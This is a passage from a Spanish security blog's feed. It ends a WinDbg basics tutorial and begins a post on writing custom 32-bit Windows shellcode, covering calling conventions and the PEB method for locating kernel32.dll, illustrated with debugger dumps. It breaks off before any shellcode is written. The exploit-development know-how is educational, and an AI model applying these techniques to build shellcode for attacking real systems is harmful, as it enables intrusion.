&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Browse full module list
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start    end        module name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;737d0000 737df000   kernel_appcore   (pdb symbols)          C:\ProgramData\Dbg\sym\Kernel.Appcore.pdb\239BF5D8CF08B2AA14562319CBC391D21\Kernel.Appcore.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75550000 75787000   KERNELBASE   (pdb symbols)          C:\ProgramData\Dbg\sym\kernelbase.pdb\9A5BA36242F92AB60025CDCB3DFA1AB41\kernelbase.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76af0000 76b8b000   KERNEL32   (pdb symbols)          C:\ProgramData\Dbg\sym\kernel32.pdb\3F37C9753B726FC015B6204CE3D41BB41\kernel32.pdb
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Con el comando &lt;code&gt;x&lt;&#x2F;code&gt;, podemos examinar cada módulo individual, de nuevo se utiliza &lt;code&gt;*&lt;&#x2F;code&gt; para filtrar:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; x kernelbase!CreateProc*
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756aabdf          KERNELBASE!CreateProcessExtensions::ReleaseAppXContext (void)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75665870          KERNELBASE!CreateProcessInternalA (void)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756dcaa0          KERNELBASE!CreateProcessWithTokenW (void)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756dc990          KERNELBASE!CreateProcessAsUserA (void)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756dc990          KERNELBASE!CreateProcessAsUserW (void)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756dc990          KERNELBASE!CreateProcessWithLogonW (void)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;7571cf0f          KERNELBASE!CreateProcessExtensions::ErrorContext::LogError (public: void __thiscall CreateProcessExtensions::ErrorContext::LogError(long,struct Common::COMMON_STRING *))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;7572ed60          KERNELBASE!CreateProcessAsUserA (_CreateProcessAsUserA@44)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756ac920          KERNELBASE!CreateProcessAsUserW (_CreateProcessAsUserW@44)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;7571cbe5          KERNELBASE!CreateProcessExtensions::CreateSharedLocalFolder (public: static long __stdcall CreateProcessExtensions::CreateSharedLocalFolder(struct Common::COMMON_STRING const &amp;amp;))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75677fd7          KERNELBASE!CreateProcessExtensions::PreCreationExtension (public: static long __stdcall CreateProcessExtensions::PreCreationExtension(void *,struct Common::COMMON_STRING *,struct _SECURITY_CAPABILITIES *,class CreateProcessExtensions::ErrorContext *,struct _APPX_PROCESS_CONTEXT * *))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75662290          KERNELBASE!CreateProcessInternalW (_CreateProcessInternalW@48)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756a4fa0          KERNELBASE!CreateProcessA (_CreateProcessA@40)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;756a6b70          KERNELBASE!CreateProcessW (_CreateProcessW@40)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Además también se puede utilizar como calculadora:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;? 77269bc0 - 77231430
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 231312 = 00038790
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Admite tanto suma, resta, división y multiplicación.&lt;&#x2F;p&gt;
&lt;p&gt;Adicionalmente, también se puede usar como conversor de datos:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; ? 41414141
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 1094795585 = 41414141
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; ? 0n41414141 &#x2F;&#x2F; Decimal
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 41414141 = 0277edfd
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; ? 0y1110100110111 &#x2F;&#x2F; Binario
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 7479 = 00001d37
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;O mostrar todos con el comando &lt;code&gt;.format&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; .formats 41414141
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Hex:     41414141
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Decimal: 1094795585
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Decimal (unsigned) : 1094795585
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Octal:   10120240501
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Binary:  01000001 01000001 01000001 01000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Chars:   AAAA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Time:    Fri Sep 10 07:53:05 2004
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Float:   low 12.0784 high 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Double:  5.40901e-315
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;referencias&quot;&gt;Referencias&lt;a class=&quot;zola-anchor&quot; href=&quot;#referencias&quot; aria-label=&quot;Anchor link for: referencias&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;es-es&#x2F;windows-hardware&#x2F;drivers&#x2F;debugger&#x2F;getting-started-with-windbg&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;es-es&#x2F;windows-hardware&#x2F;drivers&#x2F;debugger&#x2F;debugger-operation-win8&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;es-es&#x2F;windows-hardware&#x2F;drivers&#x2F;debugger&#x2F;standard-debugging-techniques&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Creación de un shellcode personalizado de 32 Bits</title>
		<published>2025-11-03T00:00:00+00:00</published>
		<updated>2025-11-03T00:00:00+00:00</updated>
		<link rel="alternate" type="text/html" href="https://example.com/posts/shellcode-personalizado-32-bits/"/>
		<id>https://example.com/posts/shellcode-personalizado-32-bits/</id>
    
		<content type="html" xml:base="https://example.com/posts/shellcode-personalizado-32-bits/">&lt;h2 id=&quot;que-es-un-shellcode&quot;&gt;Qué es un shellcode&lt;a class=&quot;zola-anchor&quot; href=&quot;#que-es-un-shellcode&quot; aria-label=&quot;Anchor link for: que-es-un-shellcode&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Un shellcode es un conjunto de Instrucciones de CPU que se ejecutan tras explotar una vulnerabilidad.&lt;&#x2F;p&gt;
&lt;p&gt;Dado que el shellcode generalmente se escribe en ensamblador y luego se traduce a los códigos de operación hexadecimales, se puede usar para manipular directamente los registros de la CPU y llamar a funciones del sistema.&lt;&#x2F;p&gt;
&lt;p&gt;Para poder llamar a una función entran en juego las convenciones de llamadas.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;convenciones-de-llamada-x86&quot;&gt;Convenciones de llamada (x86)&lt;a class=&quot;zola-anchor&quot; href=&quot;#convenciones-de-llamada-x86&quot; aria-label=&quot;Anchor link for: convenciones-de-llamada-x86&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Una convención de llamada x86 es un conjunto de reglas que definen cómo se pasan los parámetros a una función y cómo se devuelve un resultado en la arquitectura x86.&lt;&#x2F;p&gt;
&lt;p&gt;En una convención de llamada se definen:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Como se pasan los argumentos a una función.&lt;&#x2F;li&gt;
&lt;li&gt;Qué registros debe conservar el destinatario para el que llama.&lt;&#x2F;li&gt;
&lt;li&gt;Cómo debe prepararse el marco de la pila antes de llamada.&lt;&#x2F;li&gt;
&lt;li&gt;Como debe restaurarse el marco de pila después de la llamada.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Por lo tanto es fundamental saber que usar la convención de llamada correcta para la función API que se desea utilizar en el shellcode.&lt;&#x2F;p&gt;
&lt;p&gt;Por ejemplo:&lt;&#x2F;p&gt;
&lt;p&gt;Las funciones API Win32 utilizan la convención de llamada &lt;code&gt;__stdcall&lt;&#x2F;code&gt;, mientras que las funciones de tiempo de ejecución de C utilizan la llamada &lt;code&gt;__cdecl&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;En cualquier convención de llamada en un sistema de 32 bits, los registros &lt;code&gt;EAX, EDX y ECX&lt;&#x2F;code&gt;, se consideran volátiles lo que significa que pueden verse afectados durante la llamada de una función, por lo tanto no debemos confiar en estos registros a menos que hayamos comprobado que pueden verse afectados durante una llamada a una función.&lt;&#x2F;p&gt;
&lt;p&gt;Todos los demás registros se consideran no volátiles y deben ser conservados durante la ejecución de la API llamada.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;problemas-derivados-de-las-llamadas-al-sistema&quot;&gt;Problemas derivados de las llamadas al sistema&lt;a class=&quot;zola-anchor&quot; href=&quot;#problemas-derivados-de-las-llamadas-al-sistema&quot; aria-label=&quot;Anchor link for: problemas-derivados-de-las-llamadas-al-sistema&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;La API Nativa de Windows es equivalente a la llamada del sistema en los sistemas UNIX. Es una interfaz expuesta al modo usuario por la biblioteca &lt;code&gt;ntdll.dll&lt;&#x2F;code&gt;, que proporciona una forma para que las aplicaciones del modo usuario puedan llamar a funciones ubicadas en el kernel de forma controlada.&lt;&#x2F;p&gt;
&lt;p&gt;La API nativa está oculta trás la API de nivel superior debido a la naturaleza de la arquitectura NT.&lt;&#x2F;p&gt;
&lt;p&gt;Las funciones a nivel de kernel suelen identificarse mediante números de llamada al sistema que se utilizan para llamar a las funciones correspondientes.&lt;&#x2F;p&gt;
&lt;p&gt;Es importante tener en cuenta que en Windows, estos números de llamada al sistema tienden a cambiar entre versiones principales y secundarias.&lt;&#x2F;p&gt;
&lt;p&gt;Sin embargo, en sistemas Linux, estas llamadas son números fijos y no cambian.&lt;&#x2F;p&gt;
&lt;p&gt;Por ejemplo, Windows no exporta una API de socket a través de la interfaz de llamada del sistema. Esto significa que debemos evitar las llamadas directas al sistema para escribir shellcode universal y fiable para Windows.&lt;&#x2F;p&gt;
&lt;p&gt;Sin llamadas al sistema, nuestra única opción para comunicarnos directamente con el kernel es usar la API de Windows, exportada por bibliotecas de vínculos dinámicos (DLL) que se asignan a la memoria del proceso en tiempo de ejecución.&lt;&#x2F;p&gt;
&lt;p&gt;Por lo tanto, Afortunadamente &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;, expone funciones que pueden usarse para poder hacer llamadas llamadas a API como por ejemplo &lt;code&gt;CreateProccesA&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;buscando-kernel32-dll&quot;&gt;Buscando Kernel32.dll&lt;a class=&quot;zola-anchor&quot; href=&quot;#buscando-kernel32-dll&quot; aria-label=&quot;Anchor link for: buscando-kernel32-dll&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Como hemos mencionado, kernel32 exporta muchas funciones y tiene APIs necesarias para poder cargar DLL adicionales como &lt;code&gt;LoadLibrary&lt;&#x2F;code&gt; y &lt;code&gt;GetProcAddress&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Para obtener una dirección base de una DLL, debemos aseegurarmos de que esté asignada al msimo espacio de memoria que nuestro shellcode en ejecucción.&lt;&#x2F;p&gt;
&lt;p&gt;Por suerte, &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; se cargará ya que exporta las APIs neceserias para la mayoría de procesos.&lt;&#x2F;p&gt;
&lt;p&gt;Para la creación del shellcode usaremos un método conocido como &quot;&lt;em&gt;Método PEB&lt;&#x2F;em&gt;&quot;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;metodo-peb&quot;&gt;Método PEB&lt;a class=&quot;zola-anchor&quot; href=&quot;#metodo-peb&quot; aria-label=&quot;Anchor link for: metodo-peb&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;El Sistema operativo, asigna la estructura PEB a cada proceso en ejecución. Se puede encontrar recorriendo la memoria del proceso a partir del registros &lt;code&gt;FS&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;En las versiones de 32 bits de Windows, el registro &lt;code&gt;FS&lt;&#x2F;code&gt; siempre contiene un puntero al bloque de entorno de subproceso (TEB) actual. El TEB es una estructura de datos que almacena información sobre el subproceso en ejecución.&lt;&#x2F;p&gt;
&lt;p&gt;En el desplazamiento &lt;code&gt;0x30&lt;&#x2F;code&gt; desde el inicio del TEB, se encuentra un puntero a la estructura de datos PEB.&lt;&#x2F;p&gt;
&lt;p&gt;Vamos a tomar de ejemplo el Bloc de notas (&lt;em&gt;Notepad.exe&lt;&#x2F;em&gt;) de Windows y volcaremos la estructura del TEB:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dt nt!_TEB @$teb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ntdll!_TEB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 NtTib            : _NT_TIB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c EnvironmentPointer : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x020 ClientId         : _CLIENT_ID
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 ActiveRpcHandle  : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c ThreadLocalStoragePointer : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x030 ProcessEnvironmentBlock : 0x02c93000 _PEB
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El anterior fragmento de código muestra el puntero del PEB en el desplazamiento 0x30, podemos volcar la estructura y obtener información como el nombre de la imagen, los argumentos de inicio del proceso, etc.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dt nt!_PEB 0x02c93000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ntdll!_PEB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 InheritedAddressSpace : 0 &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x001 ReadImageFileExecOptions : 0 &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x002 BeingDebugged    : 0x1 &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 BitField         : 0x84 &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 ImageUsesLargePages : 0y0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 IsProtectedProcess : 0y0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 IsImageDynamicallyRelocated : 0y1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 SkipPatchingUser32Forwarders : 0y0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 IsPackagedProcess : 0y0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 IsAppContainer   : 0y0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 IsProtectedProcessLight : 0y0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 IsLongPathAwareProcess : 0y1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 Mutant           : 0xffffffff Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 ImageBaseAddress : 0x00120000 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c Ldr              : 0x77c61c60 _PEB_LDR_DATA
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Debemos prestar especial atención en el puntero &lt;code&gt;_PEB_LDR_DATA&lt;&#x2F;code&gt;, que se encuentra en el desplazamiento &lt;code&gt;0x00c&lt;&#x2F;code&gt;, este puntero referencia las tres listas enlazadas que revelan los módulos cargados que se han mapeado en la memoria del proceso.&lt;&#x2F;p&gt;
&lt;p&gt;Inspeccionemos este puntero:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dt_PEB_LDR_DATA 0x77c61c60
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ntdll!_PEB_LDR_DATA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 Length           : 0x30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 Initialized      : 0x1 &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 SsHandle         : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x2fb1c98 - 0x2ff4820 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x2fb1ca0 - 0x2ff4828 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x2fb1bc0 - 0x2ff5540 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x024 EntryInProgress  : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 ShutdownInProgress : 0 &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c ShutdownThreadId : (null) 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En el snippet de código anterior, diferenciamos las 3 listas:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x2fb1c98 - 0x2ff4820 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x2fb1ca0 - 0x2ff4828 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x2fb1bc0 - 0x2ff5540 ]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;InLoadOrderModuleList&lt;&#x2F;strong&gt;: Muestra el módulo anterior y el siguiente según el orden de carga.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;InMemoryOrderModuleList&lt;&#x2F;strong&gt;: Muestra el múdlo anterior y el siguiente según el orden de ubicación en memoria.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;InInitializationOrderModuleList&lt;&#x2F;strong&gt;: MUestra el módulo anterior y el siguiente según el orden de inicialización.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;En WinDBG, &lt;code&gt;InInitializationOrderModuleList&lt;&#x2F;code&gt;, se muestra como una estructura compuesta por dos campos:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dx -r1 (*((ntdll!_LIST_ENTRY *)0x77c61c6c))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(*((ntdll!_LIST_ENTRY *)0x77c61c6c))                 [Type: _LIST_ENTRY]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [+0x000] Flink            : 0x2fb1c98 [Type: _LIST_ENTRY *]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [+0x004] Blink            : 0x2ff4820 [Type: _LIST_ENTRY *]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Flink (siguiente) y Blink (anterior), se utilizan comúnmente en listas dobleblemente enlazadas.&lt;&#x2F;p&gt;
&lt;p&gt;Esto puede no parecer útil, pero la estructura &lt;code&gt;_lIST_ENTRY&lt;&#x2F;code&gt;, indicada en &lt;code&gt;_PEB_LDR_DATA&lt;&#x2F;code&gt;, está incrustada como parte de una estructura más grande del tipo: &lt;code&gt;_LDR_DATA_TABLE_ENTRY&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Para poder mostrar esta estructura, debemos restar &lt;code&gt;0x10&lt;&#x2F;code&gt;, a la estructura &lt;code&gt;_LIST_ENTRY&lt;&#x2F;code&gt;, para poder llegar a &lt;code&gt;_LDR_DATA_TABLE_ENTRY&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dt _LDR_DATA_TABLE_ENTRY (0x77c61c6c - 0x10)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ntdll!_LDR_DATA_TABLE_ENTRY
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x0 - 0x30 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x1 - 0x0 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x2fb1c98 - 0x2ff4820 ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 DllBase          : 0x02fb1ca0 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c EntryPoint       : 0x02ff4828 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x020 SizeOfImage      : 0x2fb1bc0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x024 FullDllName      : _UNICODE_STRING &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c BaseDllName      : _UNICODE_STRING &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x034 FlagGroup        : [4]  &amp;quot;???&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x034 Flags            : 2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A destacar, está el campo &lt;code&gt;DLLBase&lt;&#x2F;code&gt;, que contiene la dirección base de de la DLL, también podemos ver el campo &lt;code&gt;BaseDLLName&lt;&#x2F;code&gt;, que según WinDBG, la estructura es de tipo &lt;code&gt;_UNICODE_STRING&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Según la documentación de Microsoft este tipo de estructura tiene un miembro Buffer que comienza en el desplazamiento &lt;code&gt;0x04&lt;&#x2F;code&gt; desde el inicio de esta estructura, el cual contiene un puntero a una cadena de caracteres.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dx -r1 (*((ntdll!_UNICODE_STRING *)0x77c61c88))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(*((ntdll!_UNICODE_STRING *)0x77c61c88))                 [Type: _UNICODE_STRING]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [+0x000] Length           : 0x0 [Type: unsigned short]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [+0x002] MaximumLength    : 0x0 [Type: unsigned short]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [+0x004] Buffer           : 0x0 [Type: wchar_t *]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Para nosotros, esto significa que, nuestro shellcode, el nombre de la DLL comienza en el desplazamiento &lt;code&gt;0x30&lt;&#x2F;code&gt;, desde el inicio de la estrcutura: &lt;code&gt;_LDR_DATA_TABLE_ENTRY&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Llegados a este punto, podemos analizar la lista &lt;code&gt;InInitializationOrderModuleList&lt;&#x2F;code&gt;, y usar el campo &lt;code&gt;BaseDllName&lt;&#x2F;code&gt; para encontrar el módulo deseado. Si el nombre coincide, podemos obtener la dirección base (&lt;code&gt;DLLBase&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;keystone&quot;&gt;Keystone&lt;a class=&quot;zola-anchor&quot; href=&quot;#keystone&quot; aria-label=&quot;Anchor link for: keystone&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Se usará el framework keystone para ensamblar nuestro shellcode, usaremos también la biblioteca &lt;code&gt;ctypes&lt;&#x2F;code&gt; que nos permitirá ejecutar ese código directamente en la memoria del proceso de &lt;code&gt;python.exe&lt;&#x2F;code&gt; mediante varias APIs de Windows.&lt;&#x2F;p&gt;
